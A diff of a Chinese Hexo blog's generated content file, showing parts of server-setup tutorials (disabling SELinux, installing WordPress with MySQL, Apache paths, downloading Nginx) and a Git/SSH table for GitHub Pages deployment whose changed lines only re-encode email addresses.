+<h1 id="11、禁用SELinux"><a href="#11、禁用SELinux" class="headerlink" title="11、禁用SELinux"></a>11、禁用SELinux</h1><p>（安全访问控制，影响网站访问）</p>
+<pre class="highlight"><span class="line">vi /etc/sysconfig/selinux</span><br><span class="line"></span><br><span class="line">修改SELINUX=disabled</span><br><span class="line">重启操作系统（reboot）</span><br></pre>
+
+
+
+<h1 id="12、访问网站ip-80端口，安装wp网站"><a href="#12、访问网站ip-80端口，安装wp网站" class="headerlink" title="12、访问网站ip+80端口，安装wp网站"></a>12、访问网站ip+80端口，安装wp网站</h1><h1 id="13、此时需要设置mysql账户"><a href="#13、此时需要设置mysql账户" class="headerlink" title="13、此时需要设置mysql账户"></a>13、此时需要设置mysql账户</h1><pre class="highlight"><span class="line">mysql -uroot -p			# 启动mysql（需要输入mysql密码）</span><br><span class="line">create database wp_web;	# 创建mysql账户</span><br><span class="line">exit					# 退出mysql</span><br><span class="line"></span><br></pre>
+
+<p>（注意！wp-config.php  删除可重装wp网站）</p>
+<h1 id="14、其他"><a href="#14、其他" class="headerlink" title="14、其他"></a>14、其他</h1><pre class="highlight"><span class="line">/var/www/html					# Apache默认网站路径</span><br><span class="line">/etc/httpd/conf/httpd.conf		# Apache配置文件路径</span><br></pre>
+
+<p>修改DocumentRoot “/var/www”即可修改网站路径</p>
+<p> <img src="/article/2.png" alt="2" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/2.png" class="lozad post-image"></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Apache环境搭建</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>搭建Nginx + 直播推流平台</title>
     <url>/article/f9829b94.html</url>
     <content><![CDATA[<h1 id="搭建Nginx环境"><a href="#搭建Nginx环境" class="headerlink" title="搭建Nginx环境"></a>搭建Nginx环境</h1><h2 id="1、下载Nginx源码包"><a href="#1、下载Nginx源码包" class="headerlink" title="1、下载Nginx源码包"></a>1、下载Nginx源码包</h2><pre class="highlight"><span class="line">curl http://nginx.org/download/nginx-1.20.1.tar.gz -o nginx-1.20.1.tar.gz</span><br></pre>
@@ -1604,11 +1604,11 @@
 </thead>
 <tbody><tr>
 <td>设置用户名邮箱</td>
-<td>git config –global user.name “zeroChen00”<br>git config –global user.email “<a href="mailto:&#49;&#x36;&#x35;&#x32;&#53;&#x36;&#x30;&#x39;&#x33;&#56;&#64;&#x71;&#113;&#46;&#x63;&#111;&#109;">&#49;&#x36;&#x35;&#x32;&#53;&#x36;&#x30;&#x39;&#x33;&#56;&#64;&#x71;&#113;&#46;&#x63;&#111;&#109;</a>“</td>
+<td>git config –global user.name “zeroChen00”<br>git config –global user.email “<a href="mailto:&#x31;&#54;&#53;&#50;&#x35;&#54;&#48;&#x39;&#51;&#x38;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;">&#x31;&#54;&#53;&#50;&#x35;&#54;&#48;&#x39;&#51;&#x38;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a>“</td>
 </tr>
 <tr>
 <td>创建SSH密匙</td>
-<td>ssh-keygen -t rsa -C “<a href="mailto:&#49;&#x36;&#53;&#x32;&#x35;&#x36;&#48;&#x39;&#51;&#x38;&#64;&#x71;&#113;&#46;&#99;&#x6f;&#109;">&#49;&#x36;&#53;&#x32;&#x35;&#x36;&#48;&#x39;&#51;&#x38;&#64;&#x71;&#113;&#46;&#99;&#x6f;&#109;</a>“（全部回车）</td>
+<td>ssh-keygen -t rsa -C “<a href="mailto:&#x31;&#54;&#x35;&#50;&#x35;&#54;&#x30;&#57;&#x33;&#x38;&#64;&#x71;&#x71;&#46;&#99;&#111;&#109;">&#x31;&#54;&#x35;&#50;&#x35;&#54;&#x30;&#57;&#x33;&#x38;&#64;&#x71;&#x71;&#46;&#99;&#111;&#109;</a>“（全部回车）</td>
 </tr>
 <tr>
 <td>添加密匙</td>
@@ -1616,7 +1616,7 @@
 </tr>
 <tr>
 <td>验证连接</td>
-<td>ssh -T <a href="mailto:&#x67;&#x69;&#x74;&#64;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x63;&#111;&#109;">&#x67;&#x69;&#x74;&#64;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x63;&#111;&#109;</a>（yes确认）<br>显示 “Hi xxx! You’ve successfully……” 即连接成功</td>
+<td>ssh -T <a href="mailto:&#103;&#x69;&#x74;&#x40;&#x67;&#x69;&#116;&#x68;&#117;&#98;&#x2e;&#99;&#x6f;&#x6d;">&#103;&#x69;&#x74;&#x40;&#x67;&#x69;&#116;&#x68;&#117;&#98;&#x2e;&#99;&#x6f;&#x6d;</a>（yes确认）<br>显示 “Hi xxx! You’ve successfully……” 即连接成功</td>
 </tr>
 </tbody></table>
 <h2 id="2、创建Github-Pages仓库"><a href="#2、创建Github-Pages仓库" class="headerlink" title="2、创建Github Pages仓库"></a>2、创建Github Pages仓库</h2><p>Github - 加号 - New repository - Repository name 中输入 用户名.github.io - 创建</p>
@@ -1671,7 +1671,7 @@
 </tr>
 <tr>
 <td>修改 _config.yml 文件末尾的Deployment 部分</td>
-<td align="left">deploy: <br>    type: git<br>    repository: <a href="mailto:&#103;&#105;&#116;&#x40;&#103;&#105;&#116;&#104;&#117;&#x62;&#x2e;&#x63;&#x6f;&#109;">&#103;&#105;&#116;&#x40;&#103;&#105;&#116;&#104;&#117;&#x62;&#x2e;&#x63;&#x6f;&#109;</a>:zeroChen00/zeroChen00.github.io.git<br>    branch: maste</td>
+<td align="left">deploy: <br>    type: git<br>    repository: <a href="mailto:&#x67;&#105;&#x74;&#x40;&#x67;&#105;&#116;&#104;&#x75;&#98;&#46;&#99;&#x6f;&#109;">&#x67;&#105;&#x74;&#x40;&#x67;&#105;&#116;&#104;&#x75;&#98;&#46;&#99;&#x6f;&#109;</a>:zeroChen00/zeroChen00.github.io.git<br>    branch: maste</td>
 </tr>
 <tr>
 <td>上传部署</td>
